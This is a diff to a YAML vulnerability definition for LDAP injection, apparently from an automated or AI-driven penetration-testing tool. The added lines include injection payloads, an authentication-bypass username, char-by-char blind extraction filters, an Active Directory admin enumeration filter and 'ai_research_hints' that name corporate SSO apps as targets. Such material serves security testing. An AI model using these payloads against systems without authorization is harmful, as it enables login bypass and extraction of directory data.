@@ -1,27 +1,48 @@
-id: LDAPI
+id: LDAP_INJECTION
 name: LDAP Injection
 cwe:
 - CWE-90
 owasp: A03:2021 Injection
 severity_range: High - Critical
-description: User input is incorporated into LDAP queries without sanitization.
+description: Inject LDAP query syntax to bypass authentication or extract data from LDAP directory.
 detection:
+  indicators:
+  - Login forms that authenticate against LDAP
+  - User search features in corporate apps
+  - Directory lookup features
   payloads:
   - '*'
   - '*)(&'
-  - '*)(|(&'
-  - '*()|%26'''
+  - '*)(|(uid=*'
   - admin)(&))
-  - admin)(|(password=*))
-  - '*(|(mail=*))'
-  - '*)%00'
-  - admin))(|(objectClass=*)
-  strategy:
-  - 1. Identify LDAP-backed authentication or search features
-  - 2. Test with wildcard (*) and LDAP special characters
-  - '3. Test authentication bypass: admin)(&)) as username'
-  - 4. Test data extraction via OR-based injection
-  - 5. Check error messages for LDAP query structure leakage
-evidence_needed: Authentication bypass or data extraction via LDAP operator injection
+  - admin)(|(password=*
+  - '*)(uid=*))(|(uid=*'
+  - '*)(objectclass=*'
+  - '*)(|(cn=*))(|(cn=*'
+  attack_classes:
+    auth_bypass:
+      description: Login with username='*)(uid=*' and any password
+      severity: critical
+    blind_extraction:
+      description: Boolean-based extraction via filter manipulation
+      techniques:
+      - '*)(uid=admin)(|(uid=*  — confirm admin exists'
+      - '*)(uid=a*)(|(uid=*  — extract char by char'
+      severity: high
+    filter_modification:
+      description: Change filter to return more entries
+      severity: high
+exploitation:
+  auth_bypass: 'Username: *)(uid=*)) Password: anything → logs in as first user'
+  ad_admin_enumeration: 'Search filter: (&(objectClass=user)(memberOf=*Domain Admins*))'
+  password_attribute_extraction: If userPassword readable, extract via inference
+ai_research_hints:
+- Corporate apps using LDAP for SSO are primary targets
+- Look for filter parameters where * is allowed unescaped
+- AD-integrated apps often have LDAP injection in user search features
+- Test both authenticated and pre-auth contexts
+tools:
+- ldap_injection_scanner
+- Burp
 references:
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
+- https://owasp.org/www-community/attacks/LDAP_Injection
